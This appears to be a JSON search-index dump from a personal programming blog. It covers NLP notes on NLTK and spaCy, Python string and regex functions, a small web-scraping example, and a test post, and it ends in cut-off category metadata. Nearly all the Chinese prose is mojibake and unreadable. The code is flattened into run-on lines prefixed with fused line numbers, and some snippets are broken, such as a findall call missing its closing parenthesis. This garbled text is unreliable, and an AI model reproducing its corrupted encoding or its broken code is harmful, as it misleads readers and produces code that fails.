123456nltk.download('stopwords')# å¯¼å…¥å†…ç½®åœç”¨è¯from nltk.corpus import stopwordsstop_words = stopwords.words('english') 3 è¯æ€§æ ‡æ³¨ï¼ˆpart-of-speech taggingï¼‰ â€‹ è¯æ€§ï¼ˆpart-of-speechï¼‰æ˜¯è¯æ±‡åŸºæœ¬çš„è¯­æ³•å±æ€§ï¼Œé€šå¸¸ä¹Ÿç§°ä¸ºè¯æ€§ã€‚ â€‹ è¯æ€§æ ‡æ³¨æ˜¯å¾ˆå¤šNLPä»»åŠ¡çš„é¢„å¤„ç†æ­¥éª¤ï¼Œå¦‚å¥æ³•åˆ†æï¼Œç»è¿‡è¯æ€§æ ‡æ³¨åçš„æ–‡æœ¬ä¼šå¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©æ€§ï¼Œä½†ä¹Ÿä¸æ˜¯ä¸å¯æˆ–ç¼ºçš„æ­¥éª¤ã€‚ â€‹ ä¸»æµçš„åšæ³•å¯ä»¥åˆ†ä¸ºåŸºäºè§„åˆ™å’ŒåŸºäºç»Ÿè®¡çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ï¼š åŸºäºæœ€å¤§ç†µçš„è¯æ€§æ ‡æ³¨ åŸºäºç»Ÿè®¡æœ€å¤§æ¦‚ç‡è¾“å‡ºè¯æ€§ åŸºäºHMMçš„è¯æ€§æ ‡æ³¨ 123456nltk.download('averaged_perceptron_tagger')# è¯æ€§æ ‡æ³¨from nltk import pos_tagtags = pos_tag(filtered_corpus)tags[:20] 4 chunking/ç»„å—åˆ†æ â€‹ chunkingåˆ†å—æ˜¯å‘½åå®ä½“è¯†åˆ«çš„åŸºç¡€ï¼Œè¯æ€§ç»™å‡ºæ¥çš„å¥å­æˆåˆ†çš„å±æ€§ï¼Œä½†æœ‰æ—¶å€™ï¼Œæ›´å¤šçš„ä¿¡æ¯(æ¯”å¦‚å¥å­å¥æ³•ç»“æ„)å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¯¹å¥å­ä¸­çš„æ¨¡å¼æŒ–æ˜æ›´å……åˆ†ã€‚ 123456789101112131415161718192021222324from nltk.chunk import RegexpParser # RegexpParserfrom nltk import sent_tokenize,word_tokenize# å†™ä¸€ä¸ªåŒ¹é…åè¯çš„æ¨¡å¼# JJ adjective; NN noun, singular or mass# CC coordinating conjunctionpattern = \"\"\" NP: &#123;&lt;JJ&gt;*&lt;NN&gt;+&#125; &#123;&lt;JJ&gt;*&lt;NN&gt;&lt;CC&gt;*&lt;NN&gt;+&#125; \"\"\" # å®šä¹‰ç»„å—åˆ†æå™¨chunker = RegexpParser(pattern)# åˆ†å¥tokenized_sentence = nltk.sent_tokenize(text)# åˆ†è¯tokenized_words = [nltk.word_tokenize(sentence) for sentence in tokenized_sentence]# è¯æ€§æ ‡æ³¨tagged_words = [nltk.pos_tag(word) for word in tokenized_words]# è¯†åˆ«ç»„å—word_tree = [chunker.parse(word) for word in tagged_words]word_tree[0].draw() # ç»˜å›¾ 5 å‘½åå®ä½“è¯†åˆ«ï¼ˆNamed Entity Recognitionï¼ŒNERï¼‰ â€‹ å‘½åå®ä½“è¯†åˆ«åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼š1) å®ä½“è¾¹ç•Œè¯†åˆ«ï¼›2) ç¡®å®šå®ä½“ç±»åˆ«ï¼ˆäººåã€åœ°åã€æœºæ„åæˆ–å…¶ä»–ï¼‰ã€‚ â€‹ stanford core nlp modules é€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”æœ‰æ›´é«˜çš„è¯†åˆ«å‡†ç¡®åº¦ã€‚ 1234from nltk import ne_chunk, pos_tag, word_tokenizesentence = \"John studies at Stanford University.\"print(ne_chunk(pos_tag(word_tokenize(sentence)))) 6 Stemmingå’ŒLemmatizing è¯å¹²ç®—æ³• å’Œ è¯å‹è¿˜åŸ â€‹ å¯¹è‹±æ–‡å½“ä¸­çš„æ—¶æ€è¯­æ€ç­‰åšå½’ä¸€åŒ–ã€‚ â€‹ Stemmer 12345678910111213141516171819from nltk.stem import PorterStemmerstemmer = PorterStemmer()stemmer.stem(\"running\")# Out: 'run'from nltk.stem import SnowballStemmerstemmer2 = SnowballStemmer(\"english\")stemmer2.stem(\"growing\")# Out: 'grow'# Create your own stemmer using Regular Expressionfrom nltk.stem import RegexpStemmerrst = RegexpStemmer(r'ing$|s$|e$|able$')rst.stem('controllable')# Out: 'controll' â€‹ Lemmatizationå’ŒStemmerå¾ˆç±»ä¼¼ï¼Œä¸åŒçš„åœ°æ–¹åœ¨äºLemmatizationä¼šæ ¹æ®è¯­è¨€è¯æ ¹æ‰¾åˆ°åŸå‹ï¼Œè€ŒStemmeråªæ˜¯æ ¹æ®è§„åˆ™æˆªæ–­ç»“å°¾çš„ -ing ç­‰åç¼€ã€‚Stemmerçš„é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯å®ƒé€šå¸¸åªæ˜¯ä¸€ç³»åˆ—çš„è§„åˆ™ã€‚ 12345678910111213from nltk.stem import WordNetLemmatizerlemmatizer = WordNetLemmatizer()lemmatizer.lemmatize(\"makes\")# If you do not provide POS tag of the word, # lemmatizer will consider word as a noun and you may not get the result you expected lemmatizer.lemmatize('spoken')# Out: 'spoken'# ç»™å‡ºè¯æ€§lemmatizer.lemmatize('spoken','v')# Out: 'speak' NLTKï¼šWordNet â€‹ NLTKï¼Œå…¨ç§°Natural Language Toolkitï¼Œè‡ªç„¶è¯­è¨€å¤„ç†å·¥å…·åŒ…ï¼Œæ˜¯NLPç ”ç©¶é¢†åŸŸå¸¸ç”¨çš„ä¸€ä¸ªPythonåº“ï¼Œç”±å®¾å¤•æ³•å°¼äºšå¤§å­¦çš„Steven Birdå’ŒEdward Loperåœ¨Pythonçš„åŸºç¡€ä¸Šå¼€å‘çš„ä¸€ä¸ªæ¨¡å—ï¼Œè‡³ä»Šå·²æœ‰è¶…è¿‡åä¸‡è¡Œçš„ä»£ç ã€‚è¿™æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ŒåŒ…å«æ•°æ®é›†ã€Pythonæ¨¡å—ã€æ•™ç¨‹ç­‰ï¼›NLTKæ˜¯æœ€å¸¸ç”¨çš„è‹±æ–‡è‡ªç„¶è¯­è¨€å¤„ç†pythonåŸºç¡€åº“ä¹‹ä¸€ã€‚ Corpus Module Corpus WordNetä¸è¯ä¹‰è§£æ 1234567891011121314151617181920from nltk.corpus import wordnet as wn# åŒä¹‰wn.synsets('man')# ç¬¬ä¸€ç§è¯ä¹‰wn.synsets('man')[0].definition()# ç¬¬äºŒç§è¯ä¹‰wn.synsets('man')[1].definition()# é€ å¥ï¼šé€‰æ‹©ä¸€ç§è¯ä¹‰ï¼ˆdog.n.01ï¼‰dog = wn.synset('dog.n.01')dog.examples()[0]# ä¸Šä½è¯dog.hypernyms()# æŸ¥çœ‹ä¸åŒè¯ä¹‰ä¸‹çš„Lemmatizationè§£æfor syn in wn.synsets('spoken'): print(syn,':', syn.lemma_names()) Frequency Distribution 12345678910111213141516171819202122232425262728293031from nltk import ConditionalFreqDist, FreqDist...fd = FreqDist(l)fd.most_common(2)# Return a list of all samples that occur oncefd.hapaxes()# Find the word occuring max number of timesfd_w_humor.max()# Freq = Number of occurences / total number of wordsfd_w_humor.freq('the')# check how many times word 'pen' appearedfd_w_humor.get('pen')...# Conditional Frequency Distribution# Use tabulate mathod to check distribution of modal words in different genre cfd = ConditionalFreqDist( (genre, word) for genre in brown.categories() for word in brown.words(categories=genre))cfd.tabulate(conditions=genres, samples=modals)# ç»˜åˆ¶åˆ†å¸ƒå›¾l_names = ([('male',name[-1]) for name in names.words('male.txt')] + [('female',name[-1]) for name in names.words('female.txt')]) cfd_names = ConditionalFreqDist(l_names)cfd_names.plot() SpaCy â€‹ spaCyæ˜¯Pythonå’ŒCythonä¸­çš„é«˜çº§è‡ªç„¶è¯­è¨€å¤„ç†åº“ï¼Œå®ƒå»ºç«‹åœ¨æœ€æ–°çš„ç ”ç©¶åŸºç¡€ä¹‹ä¸Šï¼Œä»ä¸€å¼€å§‹å°±è®¾è®¡ç”¨äºå®é™…äº§å“ã€‚spaCy å¸¦æœ‰é¢„å…ˆè®­ç»ƒçš„ç»Ÿè®¡æ¨¡å‹å’Œå•è¯å‘é‡ï¼Œç›®å‰æ”¯æŒ 20 å¤šç§è¯­è¨€çš„æ ‡è®°ã€‚å®ƒå…·æœ‰å¿«é€Ÿçš„å¥æ³•åˆ†æå™¨ï¼Œç”¨äºæ ‡ç­¾çš„å·ç§¯ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œè§£æå’Œå‘½åå®ä½“è¯†åˆ«ä»¥åŠä¸æ·±åº¦å­¦ä¹ æ•´åˆã€‚ â€‹ !pip install -i https://pypi.tuna.tsinghua.edu.cn/simple spaCy â€‹ !python -m spacy download en â€‹ æ”¯æŒçš„è¯­è¨€ â€‹ 123456789101112131415161718192021222324252627282930313233# Tokenizationimport spacynlp = spacy.load('en')doc = nlp('Hello World!')for token in doc: print('\"' + token.text + '\"') for token in doc: print(\"&#123;0&#125;\\t&#123;1&#125;\\t&#123;2&#125;\\t&#123;3&#125;\\t&#123;4&#125;\\t&#123;5&#125;\\t&#123;6&#125;\\t&#123;7&#125;\".format( token.text, token.idx, # å¼€å§‹index token.lemma_, # åŸå‹ token.is_punct,# åˆ¤æ–­æ ‡ç‚¹ token.is_space,# åˆ¤æ–­ç©ºæ ¼ token.shape_, # è¯æ ¼å¼ token.pos_, # è¯æ€§ token.tag_ # æ ‡æ³¨ )) # æ–­å¥for sent in doc.sents: print(sent) # è¯æ€§æ ‡æ³¨print([(token.text, token.tag_) for token in doc])# NERfor ent in doc.ents: print(ent.text, ent.label_) â€‹ BIO/IOB tagging æ˜¯ä¸€ç§å¯¹ç»™å®šå¥å­ä¸­çš„å•å…ƒåšåºåˆ—æ ‡æ³¨çš„æ–¹å¼ï¼Œç”¨äºä»ç»™å®šå¥å­ä¸­æŠ½å–è¿ç»­å­—/è¯å—æ„æˆçš„æœ‰æ„ä¹‰çŸ­è¯­ã€‚ â€‹ æ¯ä¸ªè¯æ ‡æ³¨ä¸ºBï¼ˆBeginningï¼ŒæŒ‡ç¤ºæŸçŸ­è¯­èµ·å§‹ï¼‰ã€Iï¼ˆInsideï¼ŒæŒ‡ç¤ºçŸ­è¯­å†…éƒ¨ï¼‰ã€Oï¼ˆOutsideï¼ŒæŒ‡ç¤ºä¸åœ¨çŸ­è¯­ä¸­ï¼‰ä¸­çš„ä¸€ä¸ªã€‚å¦‚ï¼šB-äººå O B-æœºæ„å I-æœºæ„å 1234567891011iob_tagged = [ (token.text, token.tag_, \"&#123;0&#125;-&#123;1&#125;\".format(token.ent_iob_, token.ent_type_) if token.ent_iob_ != 'O' else token.ent_iob_) for token in doc]ent_iob = [(token.ent_iob_, token.ent_type_) for token in doc]from nltk.chunk import conlltags2tree# æŒ‰ç…§nltk.Treeçš„æ ¼å¼æ˜¾ç¤ºprint(conlltags2tree(iob_tagged)) â€‹ å¯è§†åŒ– 12345from spacy import displacydisplacy.render(doc, style='ent', jupyter=True)displacy.render(doc, style='dep', jupyter=True) image chunking/ç»„å—åˆ†æ 12for chunk in doc.noun_chunks: print(chunk.text,'---', chunk.label_,'---', chunk.root.text) å¥æ³•ä¾å­˜ 12345for token in doc: print(\"&#123;0&#125;/&#123;1&#125; &lt;--&#123;2&#125;-- &#123;3&#125;/&#123;4&#125;\".format( token.text, token.tag_, token.dep_, token.head.text, token.head.tag_)) #head displacy.render(doc, style='dep', jupyter=True, options=&#123;'distance': 90&#125;) è¯å‘é‡ 1234567891011121314151617# å¦‚æœè¦ä½¿ç”¨è‹±æ–‡çš„è¯å‘é‡ï¼Œéœ€è¦å…ˆä¸‹è½½é¢„å…ˆè®­ç»ƒå¥½çš„ç»“æœ# !python -m spacy download en_core_web_lgnlp = spacy.load('en_core_web_lg')print(nlp.vocab['banana'].vector)# åœ¨è¯å‘é‡çš„åŸºç¡€ä¸Šï¼ŒspaCyæä¾›äº†ä»è¯åˆ°æ–‡æ¡£çš„ç›¸ä¼¼åº¦è®¡ç®—çš„æ–¹æ³•target = nlp(\"Cats are beautiful animals.\") doc1 = nlp(\"Dogs are awesome.\")doc2 = nlp(\"Some gorgeous creatures are felines.\")doc3 = nlp(\"Dolphins are swimming mammals.\") print(target.similarity(doc1)) # 0.8901765218466683print(target.similarity(doc2)) # 0.9115828449161616print(target.similarity(doc3)) # 0.7822956752876101","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"english process","slug":"english-process","permalink":"https://racleray.github.io/tags/english-process/"},{"name":"nltk","slug":"nltk","permalink":"https://racleray.github.io/tags/nltk/"}]},{"title":"å¸¸ç”¨pythonæ–‡æœ¬å¤„ç†å‡½æ•°","slug":"å¸¸ç”¨pythonæ–‡æœ¬å¤„ç†å‡½æ•°","date":"2020-07-06T12:27:20.000Z","updated":"2023-08-07T11:54:31.041Z","comments":true,"path":"posts/9ad55c64.html","link":"","permalink":"https://racleray.github.io/posts/9ad55c64.html","excerpt":"è®°å½•pythonåŸºæœ¬æ–‡æœ¬å¤„ç†å‡½æ•°ï¼Œä»¥åŠæ­£åˆ™è¡¨è¾¾å¼æ¨¡å—ä½¿ç”¨ã€‚","text":"pythonå‡½æ•° 1234567891011121314151617# å»ç©ºæ ¼åŠç‰¹æ®Šç¬¦å· en_str.strip().lstrip().rstrip(',') # å­—ç¬¦ä¸²æ›¿æ¢en_str.replace('hello', 'hi')# åˆ é™¤zh_str.strip().replace('å¤§å®¶å¥½ï¼Œ', '')# é€šè¿‡joinçš„æ–¹å¼è¿æ¥\"ï¼Œ\".join(strs)æˆ–è€…str1+str2# é€šè¿‡splitçš„æ–¹å¼åˆ‡åˆ†tmp_str.split(\"ï¼›\") 12345678910# ä»¥å­—æ¯åºæ’åˆ—ï¼Œæ³¨æ„æ˜¯ä»¥è¿”å›å€¼å½¢æ€è¿”å›æ’åºç»“æœï¼Œä¸æ”¹å˜åŸlistsorted(en_strs)sorted(en_strs, key=lambda x:x[2].lower())# æŸ¥æ‰¾å¯ä»¥ç”¨indexå’Œfindzh_str.index(\"é™†è¶…\") # ç¬¬ä¸€ä¸ªindexzh_str.find(\"æ¥äº†è€å¼Ÿ\") # è¿”å›-1ï¼Œä¸ä¼šæŠ¥é”™ 12345678# å¤§å°å†™ä¸å…¶ä»–å˜åŒ–en_str.title()a = en_str.translate(en_str)en_str.lower().upper()en_str.capitalize() # capitalize å‡½æ•°å¸®åŠ©ï¼ˆhelp(func)ï¼‰ æ­£åˆ™è¡¨è¾¾å¼ æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¤„ç†å­—ç¬¦ä¸²çš„å¼ºå¤§å·¥å…·ï¼Œæ‹¥æœ‰ç‹¬ç‰¹çš„è¯­æ³•å’Œç‹¬ç«‹çš„å¤„ç†å¼•æ“ã€‚ http://regexr.com/ https://alf.nu/RegexGolf ç»ƒä¹ åœ°å€ reæ¨¡å— 12345678910111213# encoding: UTF-8import re # å°†æ­£åˆ™è¡¨è¾¾å¼ç¼–è¯‘æˆPatternå¯¹è±¡pattern = re.compile(r'hello.*\\!') # ä½¿ç”¨PatternåŒ¹é…æ–‡æœ¬ï¼Œè·å¾—åŒ¹é…ç»“æœï¼Œæ— æ³•åŒ¹é…æ—¶å°†è¿”å›Nonematch = pattern.match('hello, hanxiaoyang! How are you?')# matchä»å¤´å¼€å§‹åŒ¹é… if match: # ä½¿ç”¨Matchè·å¾—åˆ†ç»„ä¿¡æ¯ print match.group() â€‹ re.compile('pattern', re.I | re.M) ï¼šre.I(re.IGNORECASE): å¿½ç•¥å¤§å°å†™ï¼ˆæ‹¬å·å†…æ˜¯å®Œæ•´å†™æ³•ï¼Œä¸‹åŒï¼‰ re.M(MULTILINE): å¤šè¡Œæ¨¡å¼ï¼Œæ”¹å˜'^'å’Œ'$'çš„è¡Œä¸ºã€‚ â€‹ Matchå¯¹è±¡æ˜¯ä¸€æ¬¡åŒ¹é…çš„ç»“æœï¼ŒåŒ…å«äº†å¾ˆå¤šå…³äºæ­¤æ¬¡åŒ¹é…çš„ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨Matchæä¾›çš„å¯è¯»å±æ€§æˆ–æ–¹æ³•æ¥è·å–è¿™äº›ä¿¡æ¯ 1re.match â€‹ Patternå¯¹è±¡æ˜¯ä¸€ä¸ªç¼–è¯‘å¥½çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œé€šè¿‡Patternæä¾›çš„ä¸€ç³»åˆ—æ–¹æ³•å¯ä»¥å¯¹æ–‡æœ¬è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ã€‚ â€‹ Patternä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œå¿…é¡»ä½¿ç”¨re.compile()è¿›è¡Œæ„é€ ã€‚ 12345678# Patternæä¾›äº†å‡ ä¸ªå¯è¯»å±æ€§ç”¨äºè·å–è¡¨è¾¾å¼çš„ç›¸å…³ä¿¡æ¯ï¼š# pattern: ç¼–è¯‘æ—¶ç”¨çš„è¡¨è¾¾å¼å­—ç¬¦ä¸²ã€‚# flags: ç¼–è¯‘æ—¶ç”¨çš„åŒ¹é…æ¨¡å¼ã€‚æ•°å­—å½¢å¼ã€‚# groups: è¡¨è¾¾å¼ä¸­åˆ†ç»„çš„æ•°é‡ã€‚# groupindex: ä»¥è¡¨è¾¾å¼ä¸­æœ‰åˆ«åçš„ç»„çš„åˆ«åä¸ºé”®ã€ä»¥è¯¥ç»„å¯¹åº”çš„ç¼–å·ä¸ºå€¼çš„å­—å…¸ï¼Œæ²¡æœ‰åˆ«åçš„ç»„ä¸åŒ…å«åœ¨å†…ã€‚# re.S(DOTALL): ç‚¹ä»»æ„åŒ¹é…æ¨¡å¼re.compile(r'(\\w+) (\\w+)(?P&lt;sign&gt;.*)', re.DOTALL) ä½¿ç”¨pattern match(string[, pos[, endpos]]) | re.match(pattern, string[, flags]): è¿™ä¸ªæ–¹æ³•å°†ä»stringçš„posä¸‹æ ‡å¤„èµ·å°è¯•åŒ¹é…pattern å¦‚æœpatternç»“æŸæ—¶ä»å¯åŒ¹é…ï¼Œåˆ™è¿”å›ä¸€ä¸ªMatchå¯¹è±¡ å¦‚æœåŒ¹é…è¿‡ç¨‹ä¸­patternæ— æ³•åŒ¹é…ï¼Œæˆ–è€…åŒ¹é…æœªç»“æŸå°±å·²åˆ°è¾¾endposï¼Œåˆ™è¿”å›Noneã€‚ poså’Œendposçš„é»˜è®¤å€¼åˆ†åˆ«ä¸º0å’Œlen(string)ã€‚ æ³¨æ„ï¼šè¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯å®Œå…¨åŒ¹é…ã€‚å½“patternç»“æŸæ—¶è‹¥stringè¿˜æœ‰å‰©ä½™å­—ç¬¦ï¼Œä»ç„¶è§†ä¸ºæˆåŠŸã€‚æƒ³è¦å®Œå…¨åŒ¹é…ï¼Œå¯ä»¥åœ¨è¡¨è¾¾å¼æœ«å°¾åŠ ä¸Šè¾¹ç•ŒåŒ¹é…ç¬¦'$'ã€‚ search(string[, pos[, endpos]]) | re.search(pattern, string[, flags]): è¿™ä¸ªæ–¹æ³•ä»stringçš„posä¸‹æ ‡å¤„èµ·å°è¯•åŒ¹é…pattern sub(repl, string[, count]) | re.sub(pattern, repl, string[, count]): ä½¿ç”¨replæ›¿æ¢stringä¸­æ¯ä¸€ä¸ªåŒ¹é…çš„å­ä¸²åè¿”å›æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚ å½“replæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ã€ï¼Œä½†ä¸èƒ½ä½¿ç”¨ç¼–å·0ã€‚ å½“replæ˜¯ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•åº”å½“åªæ¥å—ä¸€ä¸ªå‚æ•°ï¼ˆMatchå¯¹è±¡ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç”¨äºæ›¿æ¢ï¼ˆè¿”å›çš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†å¼•ç”¨åˆ†ç»„ï¼‰ã€‚ countç”¨äºæŒ‡å®šæœ€å¤šæ›¿æ¢æ¬¡æ•°ï¼Œä¸æŒ‡å®šæ—¶å…¨éƒ¨æ›¿æ¢ã€‚ split(string[, maxsplit]) | re.split(pattern, string[, maxsplit]): æŒ‰ç…§èƒ½å¤ŸåŒ¹é…çš„å­ä¸²å°†stringåˆ†å‰²åè¿”å›åˆ—è¡¨ã€‚maxsplit ç”¨äºæŒ‡å®šæœ€å¤§åˆ†å‰²æ¬¡æ•°ï¼Œä¸æŒ‡å®šå°†å…¨éƒ¨åˆ†å‰²ã€‚ 12p = re.compile(r'\\d+')print(p.split('one1two2three3four4')) findall(string[, pos[, endpos]]) | re.findall(pattern, string[, flags]): æœç´¢stringï¼Œä»¥åˆ—è¡¨å½¢å¼è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸²ã€‚ 12p = re.compile(r'\\d+')print(p.findall('one1two2three3four4') finditer(string[, pos[, endpos]]) | re.finditer(pattern, string[, flags]): æœç´¢stringï¼Œè¿”å›ä¸€ä¸ªé¡ºåºè®¿é—®æ¯ä¸€ä¸ªåŒ¹é…ç»“æœï¼ˆMatchå¯¹è±¡ï¼‰çš„è¿­ä»£å™¨ã€‚ 123p = re.compile(r'\\d+')for m in p.finditer('one1two2three3four4'): print(m.group()) subn(repl, string[, count]) |re.subn(pattern, repl, string[, count]): è¿”å› (sub(repl, string[, count]), æ›¿æ¢æ¬¡æ•°)ã€‚ 123456789p = re.compile(r'(\\w+) (\\w+)')s = 'i say, hello world!' print(p.subn(r'\\2 \\1', s)) def func(m): return m.group(1).title() + ' ' + m.group(2).title() print(p.subn(func, s)) è¯æ¡å’Œè§£é‡ŠæŠ½å– 12345678910111213141516171819202122# å¼•å…¥çˆ¬è™«å·¥å…·åº“import requests as rqimport re# å‘é€è¯·æ±‚page = rq.get(\"https://baike.sogou.com/v231013.htm\")# è¿”å›çŠ¶æ€ç æ­£å¸¸page.status_code# è¯æ¡æ­£åˆ™è¡¨è¾¾å¼æŠ½å–title_pattern = re.compile(r'&lt;h1 id=\"title\".*?&gt;(.*?)&lt;/h1&gt;') title = title_pattern.search(page.text) print(title.group(1))# è¯æ¡æ­£åˆ™è¡¨è¾¾å¼æŠ½å–content_pattern = re.compile(r'&lt;p&gt;(.*?)&lt;\\\\/p&gt;') contents = content_pattern.findall(page.text) print(contents)list(map(lambda x:re.sub(\"&lt;a .*?&gt;|&lt;\\\\\\/[ab]&gt;\", \"\",x), contents))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"regex","slug":"regex","permalink":"https://racleray.github.io/tags/regex/"}]},{"title":"hello","slug":"hello","date":"2020-04-15T16:41:05.000Z","updated":"2023-08-07T11:54:31.036Z","comments":true,"path":"posts/3610a686.html","link":"","permalink":"https://racleray.github.io/posts/3610a686.html","excerpt":"ç¬¬ä¸€ç¯‡Blogï¼Œæµ‹è¯•ç”¨ã€‚","text":"ä¾¿ç­¾ å¯é€‰ä¾¿ç­¾ï¼š 12345678910111213primarysecondarysuccessdangerwarninginfolight Hello World. Hello World. è¡Œå†…æ ‡ç­¾ å‹¾é€‰æ¡† æ™®é€šç¤ºä¾‹ é»˜è®¤é€‰ä¸­ å†…è”ç¤ºä¾‹ åé¢æ–‡å­—ä¸æ¢è¡Œ ä¹Ÿå¯ä»¥åªä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œæ–‡å­—å†™åœ¨åè¾¹ï¼ˆè¿™æ ·ä¸æ”¯æŒå¤–è”ï¼‰ æŒ‰é’® urlï¼šè·³è½¬é“¾æ¥ textï¼šæ˜¾ç¤ºçš„æ–‡å­— titleï¼šé¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºçš„æ–‡å­—ï¼ˆå¯é€‰ï¼‰ text text ç»„å›¾ totalï¼šå›¾ç‰‡æ€»æ•°é‡ï¼Œå¯¹åº”ä¸­é—´åŒ…å«çš„å›¾ç‰‡ url æ•°é‡ n1-n2-...ï¼šæ¯è¡Œçš„å›¾ç‰‡æ•°é‡ï¼Œå¯ä»¥çœç•¥ï¼Œé»˜è®¤å•è¡Œæœ€å¤š 3 å¼ å›¾ï¼Œæ±‚å’Œå¿…é¡»ç›¸ç­‰äº totalï¼Œå¦åˆ™æŒ‰é»˜è®¤æ ·å¼ Mermaid æµç¨‹å›¾ mermaid: true æ‰ä¼šåœ¨æ–‡ç« é¡µå¯åŠ¨æµç¨‹å›¾æ¸²æŸ“","categories":[],"tags":[]}],"categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"k8s","slug":"Notes/k8s","permalink":"https://racleray.github.io/categories/Notes/k8s/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"},{"name":"LinuxNetwork","slug":"Notes/LinuxNetwork","permalink":"https://racleray.github.io/categories/Notes/LinuxNetwork/"},{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Terminal","slug":"Tools/Terminal","permalink":"https://racleray.github.io/categories/Tools/Terminal/"},{"name":"Memory","slug":"Notes/Memory","permalink":"https://racleray.github.io/categories/Notes/Memory/"},{"name":"Nginx","slug":"Notes/Nginx","permalink":"https://racleray.github.io/categories/Notes/Nginx/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"},{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"Meditation","slug":"Poetry/Meditation","permalink":"https://racleray.github.io/categories/Poetry/Meditation/"},{"name":"1","slug":"Poetry/1","permalink":"https://racleray.github.io/categories/Poetry/1/"},{"name":"Coroutine","slug":"Notes/Coroutine","permalink":"https://racleray.github.io/categories/Notes/Coroutine/"},{"name":"Web","slug":"Notes/Web","permalink":"https://racleray.github.io/categories/Notes/Web/"},{"name":"DataBase","slug":"Notes/DataBase","permalink":"https://racleray.github.io/categories/Notes/DataBase/"},{"name":"CUDA","slug":"Notes/CUDA","permalink":"https://racleray.github.io/categories/Notes/CUDA/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"},{"name":"RPC","slug":"Notes/RPC","permalink":"https://racleray.github.io/categories/Notes/RPC/"},{"name":"CMake","slug":"Notes/CMake","permalink":"https://racleray.github.io/categories/Notes/CMake/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"},{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/categories/Distributed-System/"},{"name":"Linux Kernel","slug":"Notes/Linux-Kernel","permalink":"https://racleray.github.io/categories/Notes/Linux-Kernel/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"C#","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"hack","slug":"Notes/hack","permalink":"https://racleray.github.io/categories/Notes/hack/"},{"name":"C++","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"},{"name":"Database","slug":"Notes/Database","permalink":"https://racleray.github.io/categories/Notes/Database/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"},{"name":"C","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"},{"name":"Design Patterns","slug":"Notes/Design-Patterns","permalink":"https://racleray.github.io/categories/Notes/Design-Patterns/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"},{"name":"Math","slug":"Math","permalink":"https://racleray.github.io/categories/Math/"},{"name":"basic","slug":"Math/basic","permalink":"https://racleray.github.io/categories/Math/basic/"},{"name":"Distillation","slug":"Notes/Distillation","permalink":"https://racleray.github.io/categories/Notes/Distillation/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"},{"name":"Data Augmentation","slug":"Notes/Data-Augmentation","permalink":"https://racleray.github.io/categories/Notes/Data-Augmentation/"},{"name":"Contrastive Learning","slug":"Notes/Contrastive-Learning","permalink":"https://racleray.github.io/categories/Notes/Contrastive-Learning/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"},{"name":"Algorithm","slug":"Notes/Algorithm","permalink":"https://racleray.github.io/categories/Notes/Algorithm/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"},{"name":"spark","slug":"Tools/spark","permalink":"https://racleray.github.io/categories/Tools/spark/"},{"name":"git","slug":"Tools/git","permalink":"https://racleray.github.io/categories/Tools/git/"},{"name":"Docker","slug":"Tools/Docker","permalink":"https://racleray.github.io/categories/Tools/Docker/"},{"name":"Linux","slug":"Tools/Linux","permalink":"https://racleray.github.io/categories/Tools/Linux/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/ta